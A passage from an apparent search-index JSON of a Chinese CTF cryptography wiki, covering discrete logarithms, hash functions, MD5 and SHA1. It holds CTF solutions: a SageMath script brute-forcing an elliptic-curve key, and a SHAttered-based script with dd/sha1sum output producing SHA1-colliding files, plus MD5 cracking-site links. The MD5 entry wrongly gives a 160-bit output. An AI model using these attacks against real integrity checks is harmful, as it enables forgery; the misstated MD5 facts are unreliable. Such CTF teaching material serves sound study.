            "text": "\u8fd9\u91cc\u7684\u5173\u952e\u70b9\u5728\u4e8e\u6211\u4eec\u5373\u4f7f\u77e5\u9053\u4e86 (x_1,y_1) (x_1,y_1)  \u4e5f\u96be\u4ee5\u77e5\u9053k\uff0c\u8fd9\u662f\u7531\u79bb\u6563\u5bf9\u6570\u7684\u95ee\u9898\u7684\u96be\u5ea6\u51b3\u5b9a\u7684\u3002", 
            "title": "\u5173\u952e\u70b9"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_14", 
            "text": "\u53c2\u8003\uff1a https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis  \u3002  \u8fd9\u91cc\u6211\u4eec\u4ee52013\u5e74SECCON CTF quals \u4e2d\u7684 Cryptanalysis\u4e3a\u4f8b\uff0c\u9898\u76ee\u5982\u4e0b  ![](/crypto/asymmetric/discrete_log/example/2013 SECCON CTF quals Cryptanalysis/20140127213558.png)  \u8fd9\u91cc\uff0c\u6211\u4eec\u5df2\u77e5\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u4ee5\u53ca\u5bf9\u5e94\u7684\u751f\u6210\u5143base\uff0c\u8fd8\u77e5\u9053\u76f8\u5e94\u7684\u6a21\u6570\u4ee5\u53ca\u516c\u94a5\u4ee5\u53ca\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002  \u4f46\u662f\u53ef\u4ee5\u770b\u51fa\u7684\u6211\u4eec\u7684\u6a21\u6570\u592a\u5c0f\uff0c\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u83b7\u53d6\u7ed3\u679c\u3002  \u8fd9\u91cc\u76f4\u63a5\u53c2\u8003github\u4e0a\u7684sage\u7a0b\u5e8f\uff0c\u66b4\u529b\u8dd1\u51fasecret key\u3002\u4e4b\u540e\u4fbf\u53ef\u4ee5\u89e3\u5bc6\u4e86\u3002  a   =   1234577  b   =   3213242  n   =   7654319  E   =   EllipticCurve ( GF ( n ),   [ 0 ,   0 ,   0 ,   a ,   b ])  base   =   E ([ 5234568 ,   2287747 ])  pub   =   E ([ 2366653 ,   1424308 ])  c1   =   E ([ 5081741 ,   6744615 ])  c2   =   E ([ 610619 ,   6218 ])  X   =   base  for   i   in   range ( 1 ,   n ): \n     if   X   ==   pub : \n         secret   =   i \n         print   [+] secret: ,   i \n         break \n     else : \n         X   =   X   +   base \n         print   i  m   =   c2   -   ( c1   *   secret )  print   [+] x: ,   m [ 0 ]  print   [+] y: ,   m [ 1 ]  print   [+] x+y: ,   m [ 0 ]   +   m [ 1 ]   \u66b4\u529b\u8dd1\u51fa\u7ed3\u679c  [ + ]  secret:  1584718  [ + ]  x:  2171002  [ + ]  y:  3549912  [ + ]  x+y:  5720914", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/hash/introduction/", 
            "text": "\u54c8\u5e0c\u51fd\u6570\n\n\n\u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\u628a\u6d88\u606f\u6216\u6570\u636e\u538b\u7f29\u6210\u6458\u8981\uff0c\u4f7f\u5f97\u6570\u636e\u91cf\u53d8\u5c0f\u3002\u5176\u4e00\u822c\u6a21\u578b\u5982\u4e0b\n\n\n\n\n\u663e\u7136\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2ahash\u503c\uff0c\u7406\u8bba\u4e0a\u5b58\u5728\u82e5\u5e72\u4e2a\u6d88\u606f\u4e0e\u4e4b\u5bf9\u5e94\uff0c\u5373\u78b0\u649e\u3002\n\n\n\u54c8\u5e0c\u51fd\u6570\u7684\u57fa\u672c\u9700\u6c42\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u9700\u6c42\n\n\n\u63cf\u8ff0\n\n\n\n\n\n\n\n\n\n\n\u8f93\u5165\u957f\u5ea6\u53ef\u53d8\n\n\nhash\u51fd\u6570\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e\n\n\n\n\n\n\n\u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a\n\n\nhash\u51fd\u6570\u7684\u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a\n\n\n\n\n\n\n\u6548\u7387\n\n\n\u5bf9\u4e8e\u4efb\u610f\u6d88\u606f \nx\nx\n\uff0c\u8ba1\u7b97 \nH(x)\nH(x)\n \u5f88\u5bb9\u6613\n\n\n\n\n\n\n\u5355\u5411\u6027\n\n\n\u5bf9\u4e8e\u4efb\u610f\u54c8\u5e0c\u503ch\uff0c\u60f3\u8981\u627e\u5230\u6ee1\u8db3\nH(x)=h\nH(x)=h\n \u7684x\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002\n\n\n\n\n\n\n\u6297\u5f31\u78b0\u649e\u6027\n\n\n\u5bf9\u4e8e\u4efb\u610f\u6d88\u606fx\uff0c\u627e\u5230\u6ee1\u8db3\u53e6\u4e00\u6d88\u606fy\uff0c\u6ee1\u8db3\nH(x)=H(y)\nH(x)=H(y)\n \uff0c\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002\n\n\n\n\n\n\n\u6297\u5f3a\u78b0\u649e\u6027\n\n\n\u627e\u5230\u4efb\u610f\u4e00\u5bf9\u6ee1\u8db3 \nH(x)=H(y)\nH(x)=H(y)\n \u7684\u6d88\u606fx\u548cy\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002\n\n\n\n\n\n\n\u4f2a\u968f\u673a\u6027\n\n\n\u54c8\u5e0c\u51fd\u6570\u7684\u8f93\u51fa\u6ee1\u8db3\u4f2a\u968f\u673a\u6027\u6d4b\u8bd5\u6807\u51c6\u3002\n\n\n\n\n\n\n\n\n\u6563\u5217\u503c\u7684\u76ee\u7684\u5982\u4e0b\n\n\n\n\n\u786e\u4fdd\u6d88\u606f\u7684\u5b8c\u6574\u6027\uff0c\u5373\u786e\u4fdd\u6536\u5230\u7684\u6570\u636e\u786e\u5b9e\u548c\u53d1\u9001\u65f6\u7684\u4e00\u6837\uff08\u5373\u6ca1\u6709\u4fee\u6539\u3001\u63d2\u5165\u3001\u5220\u9664\u6216\u91cd\u653e\uff09\uff0c\u9632\u6b62\u4e2d\u95f4\u4eba\u7be1\u6539\u3002\n\n\n\u5197\u4f59\u6821\u9a8c\n\n\n\u5355\u5411\u53e3\u4ee4\u6587\u4ef6\uff0c\u6bd4\u5982linux\u7cfb\u7edf\u7684\u5bc6\u7801\n\n\n\u5165\u4fb5\u68c0\u6d4b\u548c\u75c5\u6bd2\u68c0\u6d4b\u4e2d\u7684\u7279\u5f81\u7801\u68c0\u6d4b\n\n\n\n\n\u76ee\u524d\u7684Hash\u51fd\u6570\u4e3b\u8981\u6709MD5\uff0cSHA1\uff0cSHA256\uff0cSHA512\u3002\u76ee\u524d\u7684\u5927\u591a\u6570hash\u51fd\u6570\u90fd\u662f\u8fed\u4ee3\u6027\u7684\uff0c\u5373\u4f7f\u7528\u540c\u4e00\u4e2ahash\u51fd\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u8fdb\u884c\u591a\u6b21\u8fed\u4ee3\u8fd0\u7b97\u3002\n\n\n\n\n\n\n\n\n\u7b97\u6cd5\u7c7b\u578b\n\n\n\u8f93\u51fa Hash \u503c\u957f\u5ea6\n\n\n\n\n\n\n\n\n\n\nMD5\n\n\n128 bit / 256 bit\n\n\n\n\n\n\nSHA1\n\n\n160 bit\n\n\n\n\n\n\nSHA256\n\n\n256 bit\n\n\n\n\n\n\nSHA512\n\n\n512 bit", 
            "title": "\u54c8\u5e0c\u51fd\u6570\u7b80\u4ecb"
        }, 
        {
            "location": "/crypto/hash/introduction/#_1", 
            "text": "\u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\u628a\u6d88\u606f\u6216\u6570\u636e\u538b\u7f29\u6210\u6458\u8981\uff0c\u4f7f\u5f97\u6570\u636e\u91cf\u53d8\u5c0f\u3002\u5176\u4e00\u822c\u6a21\u578b\u5982\u4e0b   \u663e\u7136\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2ahash\u503c\uff0c\u7406\u8bba\u4e0a\u5b58\u5728\u82e5\u5e72\u4e2a\u6d88\u606f\u4e0e\u4e4b\u5bf9\u5e94\uff0c\u5373\u78b0\u649e\u3002  \u54c8\u5e0c\u51fd\u6570\u7684\u57fa\u672c\u9700\u6c42\u5982\u4e0b     \u9700\u6c42  \u63cf\u8ff0      \u8f93\u5165\u957f\u5ea6\u53ef\u53d8  hash\u51fd\u6570\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e    \u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a  hash\u51fd\u6570\u7684\u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a    \u6548\u7387  \u5bf9\u4e8e\u4efb\u610f\u6d88\u606f  x x \uff0c\u8ba1\u7b97  H(x) H(x)  \u5f88\u5bb9\u6613    \u5355\u5411\u6027  \u5bf9\u4e8e\u4efb\u610f\u54c8\u5e0c\u503ch\uff0c\u60f3\u8981\u627e\u5230\u6ee1\u8db3 H(x)=h H(x)=h  \u7684x\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002    \u6297\u5f31\u78b0\u649e\u6027  \u5bf9\u4e8e\u4efb\u610f\u6d88\u606fx\uff0c\u627e\u5230\u6ee1\u8db3\u53e6\u4e00\u6d88\u606fy\uff0c\u6ee1\u8db3 H(x)=H(y) H(x)=H(y)  \uff0c\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002    \u6297\u5f3a\u78b0\u649e\u6027  \u627e\u5230\u4efb\u610f\u4e00\u5bf9\u6ee1\u8db3  H(x)=H(y) H(x)=H(y)  \u7684\u6d88\u606fx\u548cy\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002    \u4f2a\u968f\u673a\u6027  \u54c8\u5e0c\u51fd\u6570\u7684\u8f93\u51fa\u6ee1\u8db3\u4f2a\u968f\u673a\u6027\u6d4b\u8bd5\u6807\u51c6\u3002     \u6563\u5217\u503c\u7684\u76ee\u7684\u5982\u4e0b   \u786e\u4fdd\u6d88\u606f\u7684\u5b8c\u6574\u6027\uff0c\u5373\u786e\u4fdd\u6536\u5230\u7684\u6570\u636e\u786e\u5b9e\u548c\u53d1\u9001\u65f6\u7684\u4e00\u6837\uff08\u5373\u6ca1\u6709\u4fee\u6539\u3001\u63d2\u5165\u3001\u5220\u9664\u6216\u91cd\u653e\uff09\uff0c\u9632\u6b62\u4e2d\u95f4\u4eba\u7be1\u6539\u3002  \u5197\u4f59\u6821\u9a8c  \u5355\u5411\u53e3\u4ee4\u6587\u4ef6\uff0c\u6bd4\u5982linux\u7cfb\u7edf\u7684\u5bc6\u7801  \u5165\u4fb5\u68c0\u6d4b\u548c\u75c5\u6bd2\u68c0\u6d4b\u4e2d\u7684\u7279\u5f81\u7801\u68c0\u6d4b   \u76ee\u524d\u7684Hash\u51fd\u6570\u4e3b\u8981\u6709MD5\uff0cSHA1\uff0cSHA256\uff0cSHA512\u3002\u76ee\u524d\u7684\u5927\u591a\u6570hash\u51fd\u6570\u90fd\u662f\u8fed\u4ee3\u6027\u7684\uff0c\u5373\u4f7f\u7528\u540c\u4e00\u4e2ahash\u51fd\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u8fdb\u884c\u591a\u6b21\u8fed\u4ee3\u8fd0\u7b97\u3002     \u7b97\u6cd5\u7c7b\u578b  \u8f93\u51fa Hash \u503c\u957f\u5ea6      MD5  128 bit / 256 bit    SHA1  160 bit    SHA256  256 bit    SHA512  512 bit", 
            "title": "\u54c8\u5e0c\u51fd\u6570"
        }, 
        {
            "location": "/crypto/hash/md5/", 
            "text": "MD5\n\n\n\u57fa\u672c\u63cf\u8ff0\n\n\nMD5\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b\n\n\n\n\n\u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c512\u6bd4\u7279\u957f\u7684\u5206\u7ec4\u3002\n\n\n\u8f93\u51fa\uff1a160\u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002\n\n\n\n\n\u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002\n\n\n\u6b64\u5916\uff0c\u6709\u65f6\u5019\u6211\u4eec\u83b7\u5f97\u5230\u7684md5\u662f16\u4f4d\u7684\uff0c\u5176\u5b9e\u90a316\u4f4d\u662f32\u4f4dmd5\u7684\u957f\u5ea6\uff0c\u662f\u4ece32\u4f4dmd5\u503c\u6765\u7684\u3002\u662f\u5c0632\u4f4dmd5\u53bb\u6389\u524d\u516b\u4f4d\uff0c\u53bb\u6389\u540e\u516b\u4f4d\u5f97\u5230\u7684\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662fMD5\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u56db\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3aMD5\u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662fMD5\u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002\n\n\n0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476\n\n\n\n\n\u7834\u89e3\n\n\n\u76ee\u524d\u53ef\u4ee5\u8bf4md5\u5df2\u7ecf\u57fa\u672c\u88ab\u653b\u7834\u4e86\uff0c\u4e00\u822c\u7684MD5\u7684\u78b0\u649e\u90fd\u53ef\u4ee5\u5728\u5982\u4e0b\u7f51\u4e0a\u83b7\u53d6\u5230\n\n\n\n\nhttp://www.cmd5.com/\n\n\nhttp://www.ttmd5.com/\n\n\nhttp://pmd5.com/\n\n\n\n\n\u9898\u76ee\n\n\n\n\nCFF 2016 \u597d\u591a\u76d0\n\n\nJarvisOJ \u597d\u591a\u76d0", 
            "title": "MD5"
        }, 
        {
            "location": "/crypto/hash/md5/#md5", 
            "text": "", 
            "title": "MD5"
        }, 
        {
            "location": "/crypto/hash/md5/#_1", 
            "text": "MD5\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b   \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c512\u6bd4\u7279\u957f\u7684\u5206\u7ec4\u3002  \u8f93\u51fa\uff1a160\u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002   \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002  \u6b64\u5916\uff0c\u6709\u65f6\u5019\u6211\u4eec\u83b7\u5f97\u5230\u7684md5\u662f16\u4f4d\u7684\uff0c\u5176\u5b9e\u90a316\u4f4d\u662f32\u4f4dmd5\u7684\u957f\u5ea6\uff0c\u662f\u4ece32\u4f4dmd5\u503c\u6765\u7684\u3002\u662f\u5c0632\u4f4dmd5\u53bb\u6389\u524d\u516b\u4f4d\uff0c\u53bb\u6389\u540e\u516b\u4f4d\u5f97\u5230\u7684\u3002  \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662fMD5\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u56db\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3aMD5\u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662fMD5\u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002  0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476", 
            "title": "\u57fa\u672c\u63cf\u8ff0"
        }, 
        {
            "location": "/crypto/hash/md5/#_2", 
            "text": "\u76ee\u524d\u53ef\u4ee5\u8bf4md5\u5df2\u7ecf\u57fa\u672c\u88ab\u653b\u7834\u4e86\uff0c\u4e00\u822c\u7684MD5\u7684\u78b0\u649e\u90fd\u53ef\u4ee5\u5728\u5982\u4e0b\u7f51\u4e0a\u83b7\u53d6\u5230   http://www.cmd5.com/  http://www.ttmd5.com/  http://pmd5.com/", 
            "title": "\u7834\u89e3"
        }, 
        {
            "location": "/crypto/hash/md5/#_3", 
            "text": "CFF 2016 \u597d\u591a\u76d0  JarvisOJ \u597d\u591a\u76d0", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/hash/sha1/", 
            "text": "SHA1\n\n\n\u57fa\u672c\u63cf\u8ff0\n\n\nSHA1\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b\n\n\n\n\n\u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c\u5206\u4e3a \n512 \u6bd4\u7279\n\u957f\u7684\u5206\u7ec4\u3002\u9996\u5148\u5728\u6d88\u606f\u53f3\u4fa7\u8865\u6bd4\u7279 1\uff0c\u7136\u540e\u518d\u8865\u82e5\u5e72\u4e2a\u6bd4\u7279 0\uff0c\u76f4\u5230\u6d88\u606f\u7684\u6bd4\u7279\u957f\u5ea6\u6ee1\u8db3\u5bf9 512 \u53d6\u6a21\u540e\u4f59\u6570\u662f 448\uff0c\u4f7f\u5176\u4e0e 448 \u6a21 512 \u540c\u4f59\u3002\n\n\n\u8f93\u51fa\uff1a160 \u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002\n\n\n\n\n\u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662f SHA1 \u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u4e94\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3a SHA1 \u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662f SHA1 \u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002\n\n\n0x67452301\n0xEFCDAB89\n0x98BADCFE\n0x10325476\n0xC3D2E1F0\n\n\n\n\n\u524d\u9762\u56db\u4e2a\u4e0e MD5 \u7c7b\u4f3c\uff0c\u540e\u9762\u7684\u662f\u65b0\u52a0\u7684\u3002\n\n\n\u7834\u89e3\n\n\n\u5c31\u76ee\u524d\u800c\u8a00\uff0cSHA1 \u5df2\u7ecf\u4e0d\u518d\u5b89\u5168\u4e86\uff0c\u56e0\u4e3a\u4e4b\u524d\u8c37\u6b4c\u516c\u5e03\u4e86\u6c42\u5f97\u4e24\u4e2a sha1 \u503c\u4e00\u6837\u7684 pdf\uff0c\u5177\u4f53\u8bf7\u53c2\u8003 \nshattered\n \u3002\n\n\n\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u7f51\u7ad9\uff1a\nhttps://alf.nu/SHA1\n\u3002\n\n\n2017 SECCON SHA1 is dead\n\n\n\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b\n\n\n\n\nfile1 != file2\n\n\nSHA1(file1) == SHA1(file2)\n\n\nSHA256(file1) \n SHA256(file2)\n\n\n2017KiB \n sizeof(file1) \n 2018KiB\n\n\n2017KiB \n sizeof(file2) \n 2018KiB\n\n\n\n\n\u5176\u4e2d 1KiB = 1024 bytes\n\n\n\u5373\u6211\u4eec\u9700\u8981\u627e\u5230\u4e24\u4e2a\u6587\u4ef6\u6ee1\u8db3\u4e0a\u8ff0\u7684\u7ea6\u675f\u3002\n\n\n\u8fd9\u91cc\u7acb\u9a6c\u5c31\u60f3\u5230\u8c37\u6b4c\u4e4b\u524d\u516c\u5e03\u7684\u6587\u6863\uff0c\u800c\u4e14\uff0c\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u53ea\u8981\u4f7f\u7528\u7ed9\u5b9a\u7684\u524d 320 \u5b57\u8282\uff0c\u540e\u9762\u4efb\u610f\u6dfb\u52a0\u4e00\u6837\u7684\u5b57\u8282\u83b7\u53d6\u7684\u54c8\u5e0c\u4ecd\u7136\u4e00\u6837\uff0c\u8fd9\u91cc\u6211\u4eec\u6d4b\u8bd5\u5982\u4e0b\n\n\n\u279c  2017_seccon_sha1_is_dead git:\n(\nmaster\n)\n dd \nbs\n=\n1\n \ncount\n=\n320\n \nshattered-1.pdf\n|\n sha1sum\n\u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165\n\u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa\n\n320\n bytes copied, \n0\n.00796817 s, \n40\n.2 kB/s\nf92d74e3874587aaf443d1db961d4e26dde13e9c  -\n\u279c  2017_seccon_sha1_is_dead git:\n(\nmaster\n)\n dd \nbs\n=\n1\n \ncount\n=\n320\n \nshattered-2.pdf\n|\n sha1sum\n\u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165\n\u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa\n\n320\n bytes copied, \n0\n.00397215 s, \n80\n.6 kB/s\nf92d74e3874587aaf443d1db961d4e26dde13e9c  -\n\n\n\n\n\u8fdb\u800c\u6211\u4eec\u76f4\u63a5\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u5982\u4e0b\n\n\nfrom\n \nhashlib\n \nimport\n \nsha1\n\n\nfrom\n \nhashlib\n \nimport\n \nsha256\n\n\n\npdf1\n \n=\n \nopen\n(\n./shattered-1.pdf\n)\n.\nread\n(\n320\n)\n\n\npdf2\n \n=\n \nopen\n(\n./shattered-2.pdf\n)\n.\nread\n(\n320\n)\n\n\npdf1\n \n=\n \npdf1\n.\nljust\n(\n2017\n \n*\n \n1024\n \n+\n \n1\n \n-\n \n320\n,\n \n\\00\n)\n  \n#padding pdf to 2017Kib + 1\n\n\npdf2\n \n=\n \npdf2\n.\nljust\n(\n2017\n \n*\n \n1024\n \n+\n \n1\n \n-\n \n320\n,\n \n\\00\n)\n\n\nopen\n(\nupload1\n,\n \nw\n)\n.\nwrite\n(\npdf1\n)\n\n\nopen\n(\nupload2\n,\n \nw\n)\n.\nwrite\n(\npdf2\n)\n\n\n\nprint\n \nsha1\n(\npdf1\n)\n.\nhexdigest\n()\n\n\nprint\n \nsha1\n(\npdf2\n)\n.\nhexdigest\n()\n\n\nprint\n \nsha256\n(\npdf1\n)\n.\nhexdigest\n()\n\n\nprint\n \nsha256\n(\npdf2\n)\n.\nhexdigest\n()\n\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://www.slideshare.net/herumi/googlesha1", 
            "title": "SHA1"
        }, 
        {
            "location": "/crypto/hash/sha1/#sha1", 
            "text": "", 
            "title": "SHA1"
        }, 
        {
            "location": "/crypto/hash/sha1/#_1", 
            "text": "SHA1\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b   \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c\u5206\u4e3a  512 \u6bd4\u7279 \u957f\u7684\u5206\u7ec4\u3002\u9996\u5148\u5728\u6d88\u606f\u53f3\u4fa7\u8865\u6bd4\u7279 1\uff0c\u7136\u540e\u518d\u8865\u82e5\u5e72\u4e2a\u6bd4\u7279 0\uff0c\u76f4\u5230\u6d88\u606f\u7684\u6bd4\u7279\u957f\u5ea6\u6ee1\u8db3\u5bf9 512 \u53d6\u6a21\u540e\u4f59\u6570\u662f 448\uff0c\u4f7f\u5176\u4e0e 448 \u6a21 512 \u540c\u4f59\u3002  \u8f93\u51fa\uff1a160 \u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002   \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002  \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662f SHA1 \u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u4e94\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3a SHA1 \u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662f SHA1 \u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002  0x67452301\n0xEFCDAB89\n0x98BADCFE\n0x10325476\n0xC3D2E1F0  \u524d\u9762\u56db\u4e2a\u4e0e MD5 \u7c7b\u4f3c\uff0c\u540e\u9762\u7684\u662f\u65b0\u52a0\u7684\u3002", 
            "title": "\u57fa\u672c\u63cf\u8ff0"
        }, 
        {
            "location": "/crypto/hash/sha1/#_2", 
            "text": "\u5c31\u76ee\u524d\u800c\u8a00\uff0cSHA1 \u5df2\u7ecf\u4e0d\u518d\u5b89\u5168\u4e86\uff0c\u56e0\u4e3a\u4e4b\u524d\u8c37\u6b4c\u516c\u5e03\u4e86\u6c42\u5f97\u4e24\u4e2a sha1 \u503c\u4e00\u6837\u7684 pdf\uff0c\u5177\u4f53\u8bf7\u53c2\u8003  shattered  \u3002  \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u7f51\u7ad9\uff1a https://alf.nu/SHA1 \u3002", 
            "title": "\u7834\u89e3"
        }, 
        {
            "location": "/crypto/hash/sha1/#2017-seccon-sha1-is-dead", 
            "text": "\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b   file1 != file2  SHA1(file1) == SHA1(file2)  SHA256(file1)   SHA256(file2)  2017KiB   sizeof(file1)   2018KiB  2017KiB   sizeof(file2)   2018KiB   \u5176\u4e2d 1KiB = 1024 bytes  \u5373\u6211\u4eec\u9700\u8981\u627e\u5230\u4e24\u4e2a\u6587\u4ef6\u6ee1\u8db3\u4e0a\u8ff0\u7684\u7ea6\u675f\u3002  \u8fd9\u91cc\u7acb\u9a6c\u5c31\u60f3\u5230\u8c37\u6b4c\u4e4b\u524d\u516c\u5e03\u7684\u6587\u6863\uff0c\u800c\u4e14\uff0c\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u53ea\u8981\u4f7f\u7528\u7ed9\u5b9a\u7684\u524d 320 \u5b57\u8282\uff0c\u540e\u9762\u4efb\u610f\u6dfb\u52a0\u4e00\u6837\u7684\u5b57\u8282\u83b7\u53d6\u7684\u54c8\u5e0c\u4ecd\u7136\u4e00\u6837\uff0c\u8fd9\u91cc\u6211\u4eec\u6d4b\u8bd5\u5982\u4e0b  \u279c  2017_seccon_sha1_is_dead git: ( master )  dd  bs = 1   count = 320   shattered-1.pdf |  sha1sum\n\u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165\n\u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320  bytes copied,  0 .00796817 s,  40 .2 kB/s\nf92d74e3874587aaf443d1db961d4e26dde13e9c  -\n\u279c  2017_seccon_sha1_is_dead git: ( master )  dd  bs = 1   count = 320   shattered-2.pdf |  sha1sum\n\u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165\n\u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320  bytes copied,  0 .00397215 s,  80 .6 kB/s\nf92d74e3874587aaf443d1db961d4e26dde13e9c  -  \u8fdb\u800c\u6211\u4eec\u76f4\u63a5\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u5982\u4e0b  from   hashlib   import   sha1  from   hashlib   import   sha256  pdf1   =   open ( ./shattered-1.pdf ) . read ( 320 )  pdf2   =   open ( ./shattered-2.pdf ) . read ( 320 )  pdf1   =   pdf1 . ljust ( 2017   *   1024   +   1   -   320 ,   \\00 )    #padding pdf to 2017Kib + 1  pdf2   =   pdf2 . ljust ( 2017   *   1024   +   1   -   320 ,   \\00 )  open ( upload1 ,   w ) . write ( pdf1 )  open ( upload2 ,   w ) . write ( pdf2 )  print   sha1 ( pdf1 ) . hexdigest ()  print   sha1 ( pdf2 ) . hexdigest ()  print   sha256 ( pdf1 ) . hexdigest ()  print   sha256 ( pdf2 ) . hexdigest ()", 
            "title": "2017 SECCON SHA1 is dead"
        }, 
        {
            "location": "/crypto/hash/sha1/#_3", 
            "text": "https://www.slideshare.net/herumi/googlesha1", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/crypto/hash/attack/", 
